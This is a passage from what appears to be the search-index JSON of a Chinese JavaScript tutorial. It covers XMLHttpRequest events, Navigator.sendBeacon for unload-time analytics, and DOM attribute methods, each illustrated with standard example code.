; } }, 5000 ); \u4e0a\u9762\u4ee3\u7801\u5728\u53d1\u51fa5\u79d2\u4e4b\u540e\uff0c\u7ec8\u6b62\u4e00\u4e2a AJAX \u8bf7\u6c42\u3002","title":"XMLHttpRequest.abort()"},{"location":"bom/xmlhttprequest/#xmlhttprequest_3","text":"","title":"XMLHttpRequest \u5b9e\u4f8b\u7684\u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#readystatechange","text":"readyState \u5c5e\u6027\u7684\u503c\u53d1\u751f\u6539\u53d8\uff0c\u5c31\u4f1a\u89e6\u53d1 readyStateChange \u4e8b\u4ef6\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 onReadyStateChange \u5c5e\u6027\uff0c\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u5bf9\u4e0d\u540c\u72b6\u6001\u8fdb\u884c\u4e0d\u540c\u5904\u7406\u3002\u5c24\u5176\u662f\u5f53\u72b6\u6001\u53d8\u4e3a 4 \u7684\u65f6\u5019\uff0c\u8868\u793a\u901a\u4fe1\u6210\u529f\uff0c\u8fd9\u65f6\u56de\u8c03\u51fd\u6570\u5c31\u53ef\u4ee5\u5904\u7406\u670d\u52a1\u5668\u4f20\u9001\u56de\u6765\u7684\u6570\u636e\u3002","title":"readyStateChange \u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#progress","text":"\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0cXMLHttpRequest \u5b9e\u4f8b\u5bf9\u8c61\u672c\u8eab\u548c\u5b9e\u4f8b\u7684 upload \u5c5e\u6027\uff0c\u90fd\u6709\u4e00\u4e2a progress \u4e8b\u4ef6\uff0c\u4f1a\u4e0d\u65ad\u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var xhr = new XMLHttpRequest (); function updateProgress ( oEvent ) { if ( oEvent . lengthComputable ) { var percentComplete = oEvent . loaded / oEvent . total ; } else { console . log ( '\u65e0\u6cd5\u8ba1\u7b97\u8fdb\u5c55' ); } } xhr . addEventListener ( 'progress' , updateProgress ); xhr . open ();","title":"progress \u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#load-error-abort","text":"load \u4e8b\u4ef6\u8868\u793a\u670d\u52a1\u5668\u4f20\u6765\u7684\u6570\u636e\u63a5\u6536\u5b8c\u6bd5\uff0cerror \u4e8b\u4ef6\u8868\u793a\u8bf7\u6c42\u51fa\u9519\uff0cabort \u4e8b\u4ef6\u8868\u793a\u8bf7\u6c42\u88ab\u4e2d\u65ad\uff08\u6bd4\u5982\u7528\u6237\u53d6\u6d88\u8bf7\u6c42\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var xhr = new XMLHttpRequest (); xhr . addEventListener ( 'load' , transferComplete ); xhr . addEventListener ( 'error' , transferFailed ); xhr . addEventListener ( 'abort' , transferCanceled ); xhr . open (); function transferComplete () { console . log ( '\u6570\u636e\u63a5\u6536\u5b8c\u6bd5' ); } function transferFailed () { console . log ( '\u6570\u636e\u63a5\u6536\u51fa\u9519' ); } function transferCanceled () { console . log ( '\u7528\u6237\u53d6\u6d88\u63a5\u6536' ); }","title":"load \u4e8b\u4ef6\u3001error \u4e8b\u4ef6\u3001abort \u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#loadend","text":"abort \u3001 load \u548c error \u8fd9\u4e09\u4e2a\u4e8b\u4ef6\uff0c\u4f1a\u4f34\u968f\u4e00\u4e2a loadend \u4e8b\u4ef6\uff0c\u8868\u793a\u8bf7\u6c42\u7ed3\u675f\uff0c\u4f46\u4e0d\u77e5\u9053\u5176\u662f\u5426\u6210\u529f\u3002 1 2 3 4 5 xhr . addEventListener ( 'loadend' , loadEnd ); function loadEnd ( e ) { console . log ( '\u8bf7\u6c42\u7ed3\u675f\uff0c\u72b6\u6001\u672a\u77e5' ); }","title":"loadend \u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#timeout","text":"\u670d\u52a1\u5668\u8d85\u8fc7\u6307\u5b9a\u65f6\u95f4\u8fd8\u6ca1\u6709\u8fd4\u56de\u7ed3\u679c\uff0c\u5c31\u4f1a\u89e6\u53d1 timeout \u4e8b\u4ef6\uff0c\u5177\u4f53\u7684\u4f8b\u5b50\u53c2\u89c1 timeout \u5c5e\u6027\u4e00\u8282\u3002","title":"timeout \u4e8b\u4ef6"},{"location":"bom/xmlhttprequest/#navigatorsendbeacon","text":"\u7528\u6237\u5378\u8f7d\u7f51\u9875\u7684\u65f6\u5019\uff0c\u6709\u65f6\u9700\u8981\u5411\u670d\u52a1\u5668\u53d1\u4e00\u4e9b\u6570\u636e\u3002\u5f88\u81ea\u7136\u7684\u505a\u6cd5\u662f\u5728 unload \u4e8b\u4ef6\u6216 beforeunload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\uff0c\u4f7f\u7528 XMLHttpRequest \u5bf9\u8c61\u53d1\u9001\u6570\u636e\u3002\u4f46\u662f\uff0c\u8fd9\u6837\u505a\u4e0d\u662f\u5f88\u53ef\u9760\uff0c\u56e0\u4e3a XMLHttpRequest \u5bf9\u8c61\u662f\u5f02\u6b65\u53d1\u9001\uff0c\u5f88\u53ef\u80fd\u5728\u5b83\u5373\u5c06\u53d1\u9001\u7684\u65f6\u5019\uff0c\u9875\u9762\u5df2\u7ecf\u5378\u8f7d\u4e86\uff0c\u4ece\u800c\u5bfc\u81f4\u53d1\u9001\u53d6\u6d88\u6216\u8005\u53d1\u9001\u5931\u8d25\u3002 \u89e3\u51b3\u65b9\u6cd5\u5c31\u662f unload \u4e8b\u4ef6\u91cc\u9762\uff0c\u52a0\u4e00\u4e9b\u5f88\u8017\u65f6\u7684\u540c\u6b65\u64cd\u4f5c\u3002\u8fd9\u6837\u5c31\u80fd\u7559\u51fa\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u4fdd\u8bc1\u5f02\u6b65 AJAX \u80fd\u591f\u53d1\u9001\u6210\u529f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function log () { let xhr = new XMLHttpRequest (); xhr . open ( 'post' , '/log' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( 'foo=bar' ); } window . addEventListener ( 'unload' , function ( event ) { log (); // a time-consuming operation for ( let i = 1 ; i < 10000 ; i ++ ) { for ( let m = 1 ; m < 10000 ; m ++ ) { continue ; } } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f3a\u5236\u6267\u884c\u4e86\u4e00\u6b21\u53cc\u91cd\u5faa\u73af\uff0c\u62d6\u957f\u4e86 unload \u4e8b\u4ef6\u7684\u6267\u884c\u65f6\u95f4\uff0c\u5bfc\u81f4\u5f02\u6b65 AJAX \u80fd\u591f\u53d1\u9001\u6210\u529f\u3002 \u7c7b\u4f3c\u7684\u8fd8\u53ef\u4ee5\u4f7f\u7528 setTimeout \u3002\u4e0b\u9762\u662f\u8ffd\u8e2a\u7528\u6237\u70b9\u51fb\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"target\" href=\"https://baidu.com\">click</a> const clickTime = 350 ; const theLink = document . getElementById ( 'target' ); function log () { let xhr = new XMLHttpRequest (); xhr . open ( 'post' , '/log' , true ); xhr . setRequestHeader ( 'Content-Type' , 'application/x-www-form-urlencoded' ); xhr . send ( 'foo=bar' ); } theLink . addEventListener ( 'click' , function ( event ) { event . preventDefault (); log (); setTimeout ( function () { window . location . href = theLink . getAttribute ( 'href' ); }, clickTime ); }); \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 setTimeout \uff0c\u62d6\u5ef6\u4e86350\u6beb\u79d2\uff0c\u624d\u8ba9\u9875\u9762\u8df3\u8f6c\uff0c\u56e0\u6b64\u4f7f\u5f97\u5f02\u6b65 AJAX \u6709\u65f6\u95f4\u53d1\u51fa\u3002 \u8fd9\u4e9b\u505a\u6cd5\u7684\u5171\u540c\u95ee\u9898\u662f\uff0c\u5378\u8f7d\u7684\u65f6\u95f4\u88ab\u786c\u751f\u751f\u62d6\u957f\u4e86\uff0c\u540e\u9762\u9875\u9762\u7684\u52a0\u8f7d\u88ab\u63a8\u8fdf\u4e86\uff0c\u7528\u6237\u4f53\u9a8c\u4e0d\u597d\u3002 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6d4f\u89c8\u5668\u5f15\u5165\u4e86 Navigator.sendBeacon() \u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u662f\u5f02\u6b65\u53d1\u51fa\u8bf7\u6c42\uff0c\u4f46\u662f\u8bf7\u6c42\u4e0e\u5f53\u524d\u9875\u9762\u7ebf\u7a0b\u8131\u94a9\uff0c\u4f5c\u4e3a\u6d4f\u89c8\u5668\u8fdb\u7a0b\u7684\u4efb\u52a1\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u8bc1\u4f1a\u628a\u6570\u636e\u53d1\u51fa\u53bb\uff0c\u4e0d\u62d6\u5ef6\u5378\u8f7d\u6d41\u7a0b\u3002 1 2 3 4 5 window . addEventListener ( 'unload' , logData , false ); function logData () { navigator . sendBeacon ( '/log' , analyticsData ); } Navigator.sendBeacon \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u6807\u670d\u52a1\u5668\u7684 URL\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6240\u8981\u53d1\u9001\u7684\u6570\u636e\uff08\u53ef\u9009\uff09\uff0c\u53ef\u4ee5\u662f\u4efb\u610f\u7c7b\u578b\uff08\u5b57\u7b26\u4e32\u3001\u8868\u5355\u5bf9\u8c61\u3001\u4e8c\u8fdb\u5236\u5bf9\u8c61\u7b49\u7b49\uff09\u3002 1 navigator . sendBeacon ( url , data ) \u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6210\u529f\u53d1\u9001\u6570\u636e\u4e3a true \uff0c\u5426\u5219\u4e3a false \u3002 \u8be5\u65b9\u6cd5\u53d1\u9001\u6570\u636e\u7684 HTTP \u65b9\u6cd5\u662f POST\uff0c\u53ef\u4ee5\u8de8\u57df\uff0c\u7c7b\u4f3c\u4e8e\u8868\u5355\u63d0\u4ea4\u6570\u636e\u3002\u5b83\u4e0d\u80fd\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <body onload=\"analytics('start')\" onunload=\"analytics('end')\"> function analytics ( state ) { if ( ! navigator . sendBeacon ) return ; var URL = 'http://example.com/analytics' ; var data = 'state=' + state + '&location=' + window . location ; navigator . sendBeacon ( URL , data ); }","title":"Navigator.sendBeacon()"},{"location":"dom/attributes/","text":"\u5c5e\u6027\u7684\u64cd\u4f5c \u00b6 HTML \u5143\u7d20\u5305\u62ec\u6807\u7b7e\u540d\u548c\u82e5\u5e72\u4e2a\u952e\u503c\u5bf9\uff0c\u8fd9\u4e2a\u952e\u503c\u5bf9\u5c31\u79f0\u4e3a\u201c\u5c5e\u6027\u201d\uff08attribute\uff09\u3002 1 2 3 < a id = \"test\" href = \"http://www.example.com\" > \u94fe\u63a5 </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5143\u7d20\u5305\u62ec\u4e24\u4e2a\u5c5e\u6027\uff1a id \u5c5e\u6027\u548c href \u5c5e\u6027\u3002 \u5c5e\u6027\u672c\u8eab\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08 Attr \u5bf9\u8c61\uff09\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u6781\u5c11\u4f7f\u7528\u3002\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\uff08 HTMlElement \u5bf9\u8c61\uff09\u6765\u64cd\u4f5c\u5c5e\u6027\u3002\u672c\u7ae0\u4ecb\u7ecd\u5982\u4f55\u64cd\u4f5c\u8fd9\u4e9b\u5c5e\u6027\u3002 Element.attributes \u5c5e\u6027 \u00b6 \u5143\u7d20\u5bf9\u8c61\u6709\u4e00\u4e2a attributes \u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u52a8\u6001\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u8be5\u5143\u7d20\u6807\u7b7e\u7684\u6240\u6709\u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\uff0c\u5c5e\u6027\u7684\u5b9e\u65f6\u53d8\u5316\u90fd\u4f1a\u53cd\u6620\u5728\u8fd9\u4e2a\u8282\u70b9\u5bf9\u8c61\u4e0a\u3002\u5176\u4ed6\u7c7b\u578b\u7684\u8282\u70b9\u5bf9\u8c61\uff0c\u867d\u7136\u4e5f\u6709 attributes \u5c5e\u6027\uff0c\u4f46\u8fd4\u56de\u7684\u90fd\u662f null \uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u8fd9\u4e2a\u5c5e\u6027\u89c6\u4e3a\u5143\u7d20\u5bf9\u8c61\u72ec\u6709\u7684\u3002 \u5355\u4e2a\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7\u5e8f\u53f7\u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5c5e\u6027\u540d\u5f15\u7528\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <body bgcolor=\"yellow\" onload=\"\"> document . body . attributes [ 0 ] document . body . attributes . bgcolor document . body . attributes [ 'ONLOAD' ] \u6ce8\u610f\uff0c\u4e0a\u9762\u4ee3\u7801\u7684\u4e09\u79cd\u65b9\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u5c5e\u6027\u503c\u3002 \u5c5e\u6027\u8282\u70b9\u5bf9\u8c61\u6709 name \u548c value \u5c5e\u6027\uff0c\u5bf9\u5e94\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u540d\u548c\u5c5e\u6027\u503c\uff0c\u7b49\u540c\u4e8e nodeName \u5c5e\u6027\u548c nodeValue \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 // HTML\u4ee3\u7801\u4e3a // <div id=\"mydiv\"> var n = document . getElementById ( 'mydiv' ); n . attributes [ 0 ]. name // \"id\" n . attributes [ 0 ]. nodeName // \"id\" n . attributes [ 0 ]. value // \"mydiv\" n . attributes [ 0 ]. nodeValue // \"mydiv\" \u4e0b\u9762\u4ee3\u7801\u53ef\u4ee5\u904d\u5386\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var para = document . getElementsByTagName ( 'p' )[ 0 ]; var result = document . getElementById ( 'result' ); if ( para . hasAttributes ()) { var attrs = para . attributes ; var output = '' ; for ( var i = attrs . length - 1 ; i >= 0 ; i -- ) { output += attrs [ i ]. name + '->' + attrs [ i ]. value ; } result . textContent = output ; } else { result . textContent = 'No attributes to show' ; } \u5143\u7d20\u7684\u6807\u51c6\u5c5e\u6027 \u00b6 HTML \u5143\u7d20\u7684\u6807\u51c6\u5c5e\u6027\uff08\u5373\u5728\u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u5c5e\u6027\uff09\uff0c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 3 var a = document . getElementById ( 'test' ); a . id // \"test\" a . href // \"http://www.example.com/\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5143\u7d20\u6807\u7b7e\u7684\u5c5e\u6027 id \u548c href \uff0c\u81ea\u52a8\u6210\u4e3a\u8282\u70b9\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 \u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u5199\u7684\u3002 1 2 var img = document . getElementById ( 'myImage' ); img . src = 'http://www.example.com/image.jpg' ; \u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u4f1a\u7acb\u523b\u66ff\u6362\u6389 img \u5bf9\u8c61\u7684 src \u5c5e\u6027\uff0c\u5373\u4f1a\u663e\u793a\u53e6\u5916\u4e00\u5f20\u56fe\u7247\u3002 \u8fd9\u79cd\u4fee\u6539\u5c5e\u6027\u7684\u65b9\u6cd5\uff0c\u5e38\u5e38\u7528\u4e8e\u6dfb\u52a0\u8868\u5355\u7684\u5c5e\u6027\u3002 1 2 3 var f = document . forms [ 0 ]; f . action = 'submit.php' ; f . method = 'POST' ; \u4e0a\u9762\u4ee3\u7801\u4e3a\u8868\u5355\u6dfb\u52a0\u63d0\u4ea4\u7f51\u5740\u548c\u63d0\u4ea4\u65b9\u6cd5\u3002 \u6ce8\u610f\uff0c\u8fd9\u79cd\u7528\u6cd5\u867d\u7136\u53ef\u4ee5\u8bfb\u5199\u5c5e\u6027\uff0c\u4f46\u662f\u65e0\u6cd5\u5220\u9664\u5c5e\u6027\uff0c delete \u8fd0\u7b97\u7b26\u5728\u8fd9\u91cc\u4e0d\u4f1a\u751f\u6548\u3002 HTML \u5143\u7d20\u7684\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u4f46\u662f JavaScript \u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u654f\u611f\u7684\u3002\u8f6c\u6362\u89c4\u5219\u662f\uff0c\u8f6c\u4e3a JavaScript \u5c5e\u6027\u540d\u65f6\uff0c\u4e00\u5f8b\u91c7\u7528\u5c0f\u5199\u3002\u5982\u679c\u5c5e\u6027\u540d\u5305\u62ec\u591a\u4e2a\u5355\u8bcd\uff0c\u5219\u91c7\u7528\u9a86\u9a7c\u62fc\u5199\u6cd5\uff0c\u5373\u4ece\u7b2c\u4e8c\u4e2a\u5355\u8bcd\u5f00\u59cb\uff0c\u6bcf\u4e2a\u5355\u8bcd\u7684\u9996\u5b57\u6bcd\u91c7\u7528\u5927\u5199\uff0c\u6bd4\u5982 onClick \u3002 \u6709\u4e9b HTML \u5c5e\u6027\u540d\u662f JavaScript \u7684\u4fdd\u7559\u5b57\uff0c\u8f6c\u4e3a JavaScript \u5c5e\u6027\u65f6\uff0c\u5fc5\u987b\u6539\u540d\u3002\u4e3b\u8981\u662f\u4ee5\u4e0b\u4e24\u4e2a\u3002 for \u5c5e\u6027\u6539\u4e3a htmlFor class \u5c5e\u6027\u6539\u4e3a className \u53e6\u5916\uff0cHTML \u5c5e\u6027\u503c\u4e00\u822c\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u662f JavaScript \u5c5e\u6027\u4f1a\u81ea\u52a8\u8f6c\u6362\u7c7b\u578b\u3002\u6bd4\u5982\uff0c\u5c06\u5b57\u7b26\u4e32 true \u8f6c\u4e3a\u5e03\u5c14\u503c\uff0c\u5c06 onClick \u7684\u503c\u8f6c\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06 style \u5c5e\u6027\u7684\u503c\u8f6c\u4e3a\u4e00\u4e2a CSSStyleDeclaration \u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5bf9\u8fd9\u4e9b\u5c5e\u6027\u8d4b\u4e88\u5404\u79cd\u7c7b\u578b\u7684\u503c\u3002 \u5c5e\u6027\u64cd\u4f5c\u7684\u6807\u51c6\u65b9\u6cd5 \u00b6 \u6982\u8ff0 \u00b6 \u5143\u7d20\u8282\u70b9\u63d0\u4f9b\u516d\u4e2a\u65b9\u6cd5\uff0c\u7528\u6765\u64cd\u4f5c\u5c5e\u6027\u3002 getAttribute() getAttributeNames() setAttribute() hasAttribute() hasAttributes() removeAttribute() \u8fd9\u6709\u51e0\u70b9\u6ce8\u610f\u3002 \uff081\uff09\u9002\u7528\u6027 \u8fd9\u516d\u4e2a\u65b9\u6cd5\u5bf9\u6240\u6709\u5c5e\u6027\uff08\u5305\u62ec\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5c5e\u6027\uff09\u90fd\u9002\u7528\u3002 \uff082\uff09\u8fd4\u56de\u503c getAttribute() \u53ea\u8fd4\u56de\u5b57\u7b26\u4e32\uff0c\u4e0d\u4f1a\u8fd4\u56de\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002 \uff083\uff09\u5c5e\u6027\u540d \u8fd9\u4e9b\u65b9\u6cd5\u53ea\u63a5\u53d7\u5c5e\u6027\u7684\u6807\u51c6\u540d\u79f0\uff0c\u4e0d\u7528\u6539\u5199\u4fdd\u7559\u5b57\uff0c\u6bd4\u5982 for \u548c class \u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002\u53e6\u5916\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u5bf9\u4e8e\u5c5e\u6027\u540d\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\u3002 1 2 var image = document . images [ 0 ]; image . setAttribute ( 'class' , 'myImage' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setAttribute \u65b9\u6cd5\u76f4\u63a5\u4f7f\u7528 class \u4f5c\u4e3a\u5c5e\u6027\u540d\uff0c\u4e0d\u7528\u5199\u6210 className \u3002 Element.getAttribute() \u00b6 Element.getAttribute \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6307\u5b9a\u5c5e\u6027\u3002\u5982\u679c\u6307\u5b9a\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a // <div id=\"div1\" align=\"left\"> var div = document . getElementById ( 'div1' ); div . getAttribute ( 'align' ) // \"left\" Element.getAttributeNames() \u00b6 Element.getAttributeNames() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u7684\u540d\u5b57\u3002\u5982\u679c\u5f53\u524d\u5143\u7d20\u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4\u3002\u4f7f\u7528 Element.attributes \u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u62ff\u5230\u540c\u6837\u7684\u7ed3\u679c\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5b83\u8fd4\u56de\u7684\u662f\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 var mydiv = document . getElementById ( 'mydiv' ); mydiv . getAttributeNames (). forEach ( function ( key ) { var value = mydiv . getAttribute ( key ); console . log ( key , value ); }) \u4e0a\u9762\u4ee3\u7801\u7528\u4e8e\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\u3002 Element.setAttribute() \u00b6 Element.setAttribute \u65b9\u6cd5\u7528\u4e8e\u4e3a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u65b0\u589e\u5c5e\u6027\u3002\u5982\u679c\u540c\u540d\u5c5e\u6027\u5df2\u5b58\u5728\uff0c\u5219\u76f8\u5f53\u4e8e\u7f16\u8f91\u5df2\u5b58\u5728\u7684\u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <button>Hello World</button> var b = document . querySelector ( 'button' ); b . setAttribute ( 'name' , 'myButton' ); b . setAttribute ( 'disabled' , true ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c button \u5143\u7d20\u7684 name \u5c5e\u6027\u88ab\u8bbe\u6210 myButton \uff0c disabled \u5c5e\u6027\u88ab\u8bbe\u6210 true \u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\uff0c\u9996\u5148\uff0c\u5c5e\u6027\u503c\u603b\u662f\u5b57\u7b26\u4e32\uff0c\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u5e03\u5c14\u503c true \u5c31\u4f1a\u53d8\u6210\u5b57\u7b26\u4e32 true \uff1b\u5176\u6b21\uff0c\u4e0a\u4f8b\u7684 disable \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u5c5e\u6027\uff0c\u5bf9\u4e8e <button> \u5143\u7d20\u6765\u8bf4\uff0c\u8fd9\u4e2a\u5c5e\u6027\u4e0d\u9700\u8981\u5c5e\u6027\u503c\uff0c\u53ea\u8981\u8bbe\u7f6e\u4e86\u5c31\u603b\u662f\u4f1a\u751f\u6548\uff0c\u56e0\u6b64 setAttribute \u65b9\u6cd5\u91cc\u9762\u53ef\u4ee5\u5c06 disabled \u5c5e\u6027\u8bbe\u6210\u4efb\u610f\u503c\u3002 Element.hasAttribute() \u00b6 Element.hasAttribute \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u662f\u5426\u5305\u542b\u6307\u5b9a\u5c5e\u6027\u3002 1 2 3 4 5 var d = document . getElementById ( 'div1' ); if ( d . hasAttribute ( 'align' )) { d . setAttribute ( 'align' , 'center' ); } \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5 div \u8282\u70b9\u662f\u5426\u542b\u6709 align \u5c5e\u6027\u3002\u5982\u679c\u6709\uff0c\u5219\u8bbe\u7f6e\u4e3a\u5c45\u4e2d\u5bf9\u9f50\u3002 Element.hasAttributes() \u00b6 Element.hasAttributes \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u6709\u5c5e\u6027\uff0c\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5c5e\u6027\uff0c\u5c31\u8fd4\u56de false \uff0c\u5426\u5219\u8fd4\u56de true \u3002 1 2 var foo = document . getElementById ( 'foo' ); foo . hasAttributes () // true Element.removeAttribute() \u00b6 Element.removeAttribute \u65b9\u6cd5\u79fb\u9664\u6307\u5b9a\u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"div1\" align=\"left\" width=\"200px\"> document . getElementById ( 'div1' ). removeAttribute ( 'align' ); // \u73b0\u5728\u7684HTML\u4ee3\u7801\u4e3a // <div id=\"div1\" width=\"200px\"> dataset \u5c5e\u6027 \u00b6 \u6709\u65f6\uff0c\u9700\u8981\u5728HTML\u5143\u7d20\u4e0a\u9644\u52a0\u6570\u636e\uff0c\u4f9b JavaScript \u811a\u672c\u4f7f\u7528\u3002\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u81ea\u5b9a\u4e49\u5c5e\u6027\u3002 1 < div id = \"mydiv\" foo = \"bar\" > \u4e0a\u9762\u4ee3\u7801\u4e3a div \u5143\u7d20\u81ea\u5b9a\u4e49\u4e86 foo \u5c5e\u6027\uff0c\u7136\u540e\u53ef\u4ee5\u7528 getAttribute() \u548c setAttribute() \u8bfb\u5199\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 var n = document . getElementById ( 'mydiv' ); n . getAttribute ( 'foo' ) // bar n . setAttribute ( 'foo' , 'baz' ) \u8fd9\u79cd\u65b9\u6cd5\u867d\u7136\u53ef\u4ee5\u8fbe\u5230\u76ee\u7684\uff0c\u4f46\u662f\u4f1a\u4f7f\u5f97 HTML \u5143\u7d20\u7684\u5c5e\u6027\u4e0d\u7b26\u5408\u6807\u51c6\uff0c\u5bfc\u81f4\u7f51\u9875\u4ee3\u7801\u901a\u4e0d\u8fc7\u6821\u9a8c\u3002 \u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528\u6807\u51c6\u63d0\u4f9b\u7684 data-* \u5c5e\u6027\u3002 1 < div id = \"mydiv\" data-foo = \"bar\" > \u7136\u540e\uff0c\u4f7f\u7528\u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684 dataset \u5c5e\u6027\uff0c\u5b83\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c HTML \u5143\u7d20\u6807\u7b7e\u7684 data-* \u5c5e\u6027\u3002 1 2 3 var n = document . getElementById ( 'mydiv' ); n . dataset . foo // bar n . dataset . foo = 'baz' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 dataset.foo \u8bfb\u5199 data-foo \u5c5e\u6027\u3002 \u5220\u9664\u4e00\u4e2a data-* \u5c5e\u6027\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 delete \u547d\u4ee4\u3002 1 delete document . getElementById ( 'myDiv' ). dataset . foo ; \u9664\u4e86 dataset 